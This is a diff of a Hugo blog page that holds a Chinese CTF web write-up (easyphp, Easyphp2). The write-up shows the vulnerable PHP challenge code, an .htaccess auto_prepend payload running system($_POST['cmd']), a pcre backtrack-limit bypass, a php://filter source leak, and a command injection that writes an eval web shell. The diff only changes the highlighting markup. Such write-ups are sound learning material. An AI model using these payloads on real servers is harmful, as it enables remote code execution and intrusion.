@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.93.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.8cbe976441b5181abfd3093c9beee209b19cdbb1fa77c48d225a83ba81fa3fb1.js"></script>
+        <script src="/js/meme.min.45a777da25d0b1805991f984be4e9ae5e17f3ea94097882dff058256fa34eb17.js"></script>
 
     
 
@@ -309,40 +309,40 @@
 </span><span class="lnt">33
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"> <span class="o">&lt;?</span><span class="nx">php</span>
-    <span class="nv">$files</span> <span class="o">=</span> <span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;./&#39;</span><span class="p">);</span> 
-    <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">if</span><span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
-            <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">!==</span> <span class="s2">&#34;index.php&#34;</span><span class="p">)</span> <span class="p">{</span>
-                <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
-            <span class="p">}</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]))</span> <span class="p">{</span>
-        <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-        <span class="k">die</span><span class="p">();</span>
-    <span class="p">}</span>
-    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
-    <span class="k">if</span><span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;on&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;html&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;type&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;upload&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;file&#39;</span><span class="p">))</span> <span class="p">{</span>
-        <span class="k">echo</span> <span class="s2">&#34;Hacker&#34;</span><span class="p">;</span>
-        <span class="k">die</span><span class="p">();</span>
-    <span class="p">}</span>
-    <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
-    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[^a-z\.]/&#34;</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">echo</span> <span class="s2">&#34;Hacker&#34;</span><span class="p">;</span>
-        <span class="k">die</span><span class="p">();</span>
-    <span class="p">}</span>
-    <span class="nv">$files</span> <span class="o">=</span> <span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;./&#39;</span><span class="p">);</span> 
-    <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">if</span><span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
-            <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">!==</span> <span class="s2">&#34;index.php&#34;</span><span class="p">)</span> <span class="p">{</span>
-                <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
-            <span class="p">}</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$content</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Hello, world&#34;</span><span class="p">);</span>
-<span class="cp">?&gt;</span><span class="err"> 
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$files</span> <span class="o">=</span> <span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;./&#39;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">!==</span> <span class="s2">&#34;index.php&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;on&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;html&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;type&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;upload&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;file&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Hacker&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[^a-z\.]/&#34;</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Hacker&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$files</span> <span class="o">=</span> <span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;./&#39;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">!==</span> <span class="s2">&#34;index.php&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$content</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Hello, world&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>文件包含，其中文件内容不能有<strong>on|html|type|flag|upload|file</strong>关键字，文件名只能有字母和点，且每次访问都会删除当前目录除index.php之外的文件。</p>
 <p>写个一句话，发现没有被解析，可能是php解析配置<code>php_flag engine</code>关闭了。配置的问题还是要回归配置文件，虽然主配置文件中关闭了php解析，但.htaccess优先度高于主配置文件，因此我们可以使用.htaccess执行php代码。</p>
@@ -353,8 +353,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">?</span><span class="nx">filename</span><span class="o">=.</span><span class="nx">htaccess</span><span class="o">&amp;</span><span class="nx">content</span><span class="o">=</span><span class="nx">php_value</span><span class="o">%</span><span class="mi">20</span><span class="nx">auto_prepend_fi\</span><span class="o">%</span><span class="mi">0</span><span class="nx">ale</span><span class="o">%</span><span class="mi">20</span><span class="s2">&#34;.htaccess&#34;</span><span class="o">%</span><span class="mi">0</span><span class="nx">a</span><span class="o">%</span><span class="mi">23</span><span class="o">%</span><span class="mi">20</span><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">system</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">\
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">filename</span><span class="o">=.</span><span class="nx">htaccess</span><span class="o">&amp;</span><span class="nx">content</span><span class="o">=</span><span class="nx">php_value</span><span class="o">%</span><span class="mi">20</span><span class="nx">auto_prepend_fi\</span><span class="o">%</span><span class="mi">0</span><span class="nx">ale</span><span class="o">%</span><span class="mi">20</span><span class="s2">&#34;.htaccess&#34;</span><span class="o">%</span><span class="mi">0</span><span class="nx">a</span><span class="o">%</span><span class="mi">23</span><span class="o">%</span><span class="mi">20</span><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">system</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">\
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><h3 id="法二"><a href="#法二" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:法二" class="headings">法二</a></h3>
 <p><strong>通过php_value来设置preg_macth正则回溯次数</strong></p>
@@ -363,8 +363,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">?</span><span class="nx">filename</span><span class="o">=.</span><span class="nx">htaccess</span><span class="o">&amp;</span><span class="nx">content</span><span class="o">=</span><span class="nx">php_value</span><span class="o">%</span><span class="mi">20</span><span class="nx">pcre</span><span class="o">.</span><span class="nx">backtrack_limit</span><span class="o">%</span><span class="mi">200</span><span class="o">%</span><span class="mi">0</span><span class="nx">aphp_value</span><span class="o">%</span><span class="mi">20</span><span class="nx">pcre</span><span class="o">.</span><span class="nx">jit</span><span class="o">%</span><span class="mi">200</span><span class="o">%</span><span class="mi">0</span><span class="nx">a</span><span class="o">%</span><span class="mi">23</span><span class="nx">\</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">filename</span><span class="o">=.</span><span class="nx">htaccess</span><span class="o">&amp;</span><span class="nx">content</span><span class="o">=</span><span class="nx">php_value</span><span class="o">%</span><span class="mi">20</span><span class="nx">pcre</span><span class="o">.</span><span class="nx">backtrack_limit</span><span class="o">%</span><span class="mi">200</span><span class="o">%</span><span class="mi">0</span><span class="nx">aphp_value</span><span class="o">%</span><span class="mi">20</span><span class="nx">pcre</span><span class="o">.</span><span class="nx">jit</span><span class="o">%</span><span class="mi">200</span><span class="o">%</span><span class="mi">0</span><span class="nx">a</span><span class="o">%</span><span class="mi">23</span><span class="nx">\</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>使preg_match返回False，继而绕过了正则判断，然后的过程由于源码没有使用include，所以应该还是利用.htaccess写入php代码自包含吧，那和前一种方法差不多(自认为)。</p>
 <h2 id="easyphp2"><a href="#easyphp2" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:easyphp2" class="headings">Easyphp2</a></h2>
@@ -375,8 +375,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">?</span><span class="nx">file</span><span class="o">=</span><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">convert</span><span class="o">.</span><span class="nx">quoted</span><span class="o">-</span><span class="nx">printable</span><span class="o">-</span><span class="nx">encode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="nx">GWHT</span><span class="o">.</span><span class="nx">php</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">file</span><span class="o">=</span><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">convert</span><span class="o">.</span><span class="nx">quoted</span><span class="o">-</span><span class="nx">printable</span><span class="o">-</span><span class="nx">encode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="nx">GWHT</span><span class="o">.</span><span class="nx">php</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>在<a href="https://www.webatic.com/quoted-printable-convertor" target="_blank" rel="noopener">Encode/Decode Quoted Printable</a>还原，获得源码</p>
 <p>GWHT.php</p>
@@ -402,25 +402,25 @@
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;max_execution_time&#39;</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>
-
-<span class="k">if</span> <span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="nx">getenv</span><span class="p">(</span><span class="s1">&#39;PASS&#39;</span><span class="p">))</span> <span class="p">{</span>
-<span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;pass&#39;</span><span class="p">,</span> <span class="s1">&#39;PASS&#39;</span><span class="p">);</span>
-<span class="k">die</span><span class="p">(</span><span class="s1">&#39;&lt;h2&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;&lt;hacker&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;&lt;h2&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;&lt;h1&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;404&#39;</span><span class="o">.</span><span class="s1">&#39;&lt;h1&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;Sorry, only people from GWHT are allowed to access this website.&#39;</span><span class="o">.</span><span class="s1">&#39;23333&#39;</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="cp">?&gt;</span><span class="err">
-</span><span class="err">...
-</span><span class="err">&lt;?php
-</span><span class="err">if (isset($_GET[&#34;count&#34;])) {
-</span><span class="err">$count = $_GET[&#34;count&#34;];
-</span><span class="err">if(preg_match(&#39;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#39;, $count)){
-</span><span class="err">die(&#39;hacker!&#39;);
-</span><span class="err">}
-</span><span class="err">echo &#34;&lt;h2&gt;The Count is: &#34; . exec(&#39;printf \&#39;&#39; . $count . &#39;\&#39; | wc -c&#39;) . &#34;&lt;/h2&gt;&#34;;
-</span><span class="err">}
-</span><span class="err">?&gt;
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;max_execution_time&#39;</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="nx">getenv</span><span class="p">(</span><span class="s1">&#39;PASS&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;pass&#39;</span><span class="p">,</span> <span class="s1">&#39;PASS&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">die</span><span class="p">(</span><span class="s1">&#39;&lt;h2&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;&lt;hacker&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;&lt;h2&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;&lt;h1&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;404&#39;</span><span class="o">.</span><span class="s1">&#39;&lt;h1&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;Sorry, only people from GWHT are allowed to access this website.&#39;</span><span class="o">.</span><span class="s1">&#39;23333&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">...
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="err">if (isset($_GET[&#34;count&#34;])) {
+</span></span></span><span class="line"><span class="cl"><span class="err">$count = $_GET[&#34;count&#34;];
+</span></span></span><span class="line"><span class="cl"><span class="err">if(preg_match(&#39;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#39;, $count)){
+</span></span></span><span class="line"><span class="cl"><span class="err">die(&#39;hacker!&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="err">}
+</span></span></span><span class="line"><span class="cl"><span class="err">echo &#34;&lt;h2&gt;The Count is: &#34; . exec(&#39;printf \&#39;&#39; . $count . &#39;\&#39; | wc -c&#39;) . &#34;&lt;/h2&gt;&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">}
+</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>check.php</p>
 <div class="highlight"><div class="chroma">
@@ -432,12 +432,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="nv">$pass</span> <span class="o">=</span> <span class="s2">&#34;GWHT&#34;</span><span class="p">;</span>
-<span class="c1">// Cookie password.
-</span><span class="c1"></span><span class="k">echo</span> <span class="s2">&#34;Here is nothing, isn&#39;t it ?&#34;</span><span class="p">;</span>
-<span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: /&#39;</span><span class="p">);</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$pass</span> <span class="o">=</span> <span class="s2">&#34;GWHT&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Cookie password.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="s2">&#34;Here is nothing, isn&#39;t it ?&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: /&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>写木马</p>
 <div class="highlight"><div class="chroma">
@@ -445,8 +445,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="mi">1</span><span class="s1">&#39;| echo &#34;&lt;?=eval(\$_POST[&#39;</span><span class="nx">shell</span><span class="s1">&#39;])?&gt;&#34; &gt; shell.php ||&#39;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39;| echo &#34;&lt;?=eval(\$_POST[&#39;</span><span class="nx">shell</span><span class="s1">&#39;])?&gt;&#34; &gt; shell.php ||&#39;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>蚁剑连接，根目录下没有flag，但是在<code>/GWHT/README</code>读到<code>My password hash is 877862561ba0162ce610dd8bf90868ad414f0ec6</code>，解出来密钥为<code>GWHTCTF</code>。再执行一下<code>ls -l</code>查看文件权限，发现所有人是GWHT，也就是我们需要切换为该用户，呃呃呃，su命令用不了咋整啊，嘤嘤嘤。。。</p>
 <p>赶紧恶补一下Linux提权，收集信息的过程中查看root进程发现</p>
@@ -455,8 +455,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">/bin/sh -c bash -c <span class="s1">&#39;echo $FLAG &gt; /GWHT/system/of/a/down/flag.txt &amp;&amp; apache2-foreground&#39;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/bin/sh -c bash -c <span class="s1">&#39;echo $FLAG &gt; /GWHT/system/of/a/down/flag.txt &amp;&amp; apache2-foreground&#39;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>环境变量里有，那还等什么，直接echo出flag。</p>
 <h2 id="easyser"><a href="#easyser" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 